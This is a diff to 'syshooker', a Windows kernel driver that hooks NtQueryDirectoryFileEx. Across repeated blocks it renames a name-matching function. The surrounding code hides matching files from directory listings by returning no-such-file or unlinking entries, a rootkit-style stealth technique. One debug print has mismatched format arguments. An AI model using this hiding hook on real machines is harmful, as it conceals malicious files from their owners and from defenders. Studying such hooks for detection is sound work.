@@ -42,7 +42,7 @@ NTSTATUS DetourNtQueryDirectoryFileEx(
 			for (size_t i = 0; i < FileName->Length && i < SYSHOOKER_MAX_NAME_LENGTH - 1; i++) {
 				TempBuffer[i] = FileName->Buffer[i];
 			}
-			if (matchMagicNames(TempBuffer, (Target)TARGET_FILE)) { // FileName is used in tab-autocomplete filename
+			if (matchSyshookerNames(TempBuffer, (Target)TARGET_FILE)) { // FileName is used in tab-autocomplete filename
 				return STATUS_NO_SUCH_FILE;
 			}
 		}
@@ -57,7 +57,7 @@ NTSTATUS DetourNtQueryDirectoryFileEx(
 				for (size_t i = 0; i < FileInformationPtr->FileNameLength / 2 && i < SYSHOOKER_MAX_NAME_LENGTH - 1; ++i) {
 					FileNameBuffer[i] = (FileInformationPtr->FileName)[i];
 				}
-				if (matchMagicNames(FileNameBuffer, (Target)TARGET_FILE)) {
+				if (matchSyshookerNames(FileNameBuffer, (Target)TARGET_FILE)) {
 					kprintf("[+] syshooker: NtQueryDirectoryFileEx: should hide: %ws\n", FileNameBuffer);
 					// Not the last one
 					if (FileInformationPtr->NextEntryOffset > 0) {
@@ -110,7 +110,7 @@ NTSTATUS DetourNtQueryDirectoryFileEx(
 				for (size_t i = 0; i < FileInformationPtr->FileNameLength / 2 && i < SYSHOOKER_MAX_NAME_LENGTH - 1; ++i) {
 					FileNameBuffer[i] = (FileInformationPtr->FileName)[i];
 				}
-				if (matchMagicNames(FileNameBuffer, (Target)TARGET_FILE)) {
+				if (matchSyshookerNames(FileNameBuffer, (Target)TARGET_FILE)) {
 					kprintf("[+] syshooker: NtQueryDirectoryFileEx: SHOULD HIDE: %ws\n", FileNameBuffer);
 
 					// Not the last one
@@ -165,7 +165,7 @@ NTSTATUS DetourNtQueryDirectoryFileEx(
 				for (size_t i = 0; i < FileInformationPtr->FileNameLength / 2 && i < SYSHOOKER_MAX_NAME_LENGTH - 1; ++i) {
 					FileNameBuffer[i] = (FileInformationPtr->FileName)[i];
 				}
-				if (matchMagicNames(FileNameBuffer, (Target)TARGET_FILE)) {
+				if (matchSyshookerNames(FileNameBuffer, (Target)TARGET_FILE)) {
 					kprintf("[+] syshooker: NtQueryDirectoryFileEx: should hide: %ws\n", FileNameBuffer);
 					// Not the last one
 					if (FileInformationPtr->NextEntryOffset > 0) {
@@ -217,7 +217,7 @@ NTSTATUS DetourNtQueryDirectoryFileEx(
 				for (size_t i = 0; i < FileInformationPtr->FileNameLength / 2 && i < SYSHOOKER_MAX_NAME_LENGTH - 1; ++i) {
 					FileNameBuffer[i] = (FileInformationPtr->FileName)[i];
 				}
-				if (matchMagicNames(FileNameBuffer, (Target)TARGET_FILE)) {
+				if (matchSyshookerNames(FileNameBuffer, (Target)TARGET_FILE)) {
 					kprintf("[+] syshooker: NtQueryDirectoryFileEx: should hide: %ws\n", FileNameBuffer);
 					// Not the last one
 					if (FileInformationPtr->NextEntryOffset > 0) {
@@ -269,7 +269,7 @@ NTSTATUS DetourNtQueryDirectoryFileEx(
 				for (size_t i = 0; i < FileInformationPtr->FileNameLength / 2 && i < SYSHOOKER_MAX_NAME_LENGTH - 1; ++i) {
 					FileNameBuffer[i] = (FileInformationPtr->FileName)[i];
 				}
-				if (matchMagicNames(FileNameBuffer, (Target)TARGET_FILE)) {
+				if (matchSyshookerNames(FileNameBuffer, (Target)TARGET_FILE)) {
 					kprintf("[+] syshooker: NtQueryDirectoryFileEx: should hide: %ws\n", FileInformationPtr->FileNameLength, FileNameBuffer);
 					// Not the last one
 					if (FileInformationPtr->NextEntryOffset > 0) {
@@ -321,7 +321,7 @@ NTSTATUS DetourNtQueryDirectoryFileEx(
 				for (size_t i = 0; i < FileInformationPtr->FileNameLength / 2 && i < SYSHOOKER_MAX_NAME_LENGTH - 1; ++i) {
 					FileNameBuffer[i] = (FileInformationPtr->FileName)[i];
 				}
-				if (matchMagicNames(FileNameBuffer, (Target)TARGET_FILE)) {
+				if (matchSyshookerNames(FileNameBuffer, (Target)TARGET_FILE)) {
 					kprintf("[+] syshooker: NtQueryDirectoryFileEx: should hide: %ws\n", FileNameBuffer);
 					// Not the last one
 					if (FileInformationPtr->NextEntryOffset > 0) {
@@ -373,7 +373,7 @@ NTSTATUS DetourNtQueryDirectoryFileEx(
 				for (size_t i = 0; i < FileInformationPtr->FileNameLength / 2 && i < SYSHOOKER_MAX_NAME_LENGTH - 1; ++i) {
 					FileNameBuffer[i] = (FileInformationPtr->FileName)[i];
 				}
-				if (matchMagicNames(FileNameBuffer, (Target)TARGET_FILE)) {
+				if (matchSyshookerNames(FileNameBuffer, (Target)TARGET_FILE)) {
 					kprintf("[+] syshooker: NtQueryDirectoryFileEx: should hide: %ws\n", FileNameBuffer);
 					// Not the last one
 					if (FileInformationPtr->NextEntryOffset > 0) {
@@ -425,7 +425,7 @@ NTSTATUS DetourNtQueryDirectoryFileEx(
 				for (size_t i = 0; i < FileInformationPtr->FileNameLength / 2 && i < SYSHOOKER_MAX_NAME_LENGTH - 1; ++i) {
 					FileNameBuffer[i] = (FileInformationPtr->FileName)[i];
 				}
-				if (matchMagicNames(FileNameBuffer, (Target)TARGET_FILE)) {
+				if (matchSyshookerNames(FileNameBuffer, (Target)TARGET_FILE)) {
 					kprintf("[+] syshooker: NtQueryDirectoryFileEx: should hide: %ws\n", FileNameBuffer);
 					// Not the last one
 					if (FileInformationPtr->NextEntryOffset > 0) {
@@ -477,7 +477,7 @@ NTSTATUS DetourNtQueryDirectoryFileEx(
 				for (size_t i = 0; i < FileInformationPtr->FileNameLength / 2 && i < SYSHOOKER_MAX_NAME_LENGTH - 1; ++i) {
 					FileNameBuffer[i] = (FileInformationPtr->FileName)[i];
 				}
-				if (matchMagicNames(FileNameBuffer, (Target)TARGET_FILE)) {
+				if (matchSyshookerNames(FileNameBuffer, (Target)TARGET_FILE)) {
 					kprintf("[+] syshooker: NtQueryDirectoryFileEx: should hide: %ws\n", FileNameBuffer);
 					// Not the last one
 					if (FileInformationPtr->NextEntryOffset > 0) {
